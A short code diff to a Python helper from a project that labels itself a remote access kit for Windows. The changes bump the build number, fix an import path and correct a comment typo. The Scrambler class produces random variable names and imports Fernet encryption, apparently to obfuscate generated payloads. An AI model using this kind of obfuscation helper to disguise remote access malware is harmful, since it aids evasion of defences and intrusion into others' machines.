@@ -10,16 +10,16 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.2
+# Build:  1.0.21
 # -------------------------------------------------------------
 import string
 import random
 from cryptography.fernet import Fernet
-from ..logging.logging import LoggingUtilitys
+from core.logging.logging import LoggingUtilitys
 
 class Scrambler:
 
-    #Function will return a scrambled string with the len passwed as parameter
+    #Function will return a scrambled string with the len passed as parameter
     def scrambleVar(self,int_var_length):
         random_chars = string.ascii_letters                                                             #Get random letters
         scrambled_chars = (''.join(random.choice(random_chars) for i in range(1, int(int_var_length)))) #Join them
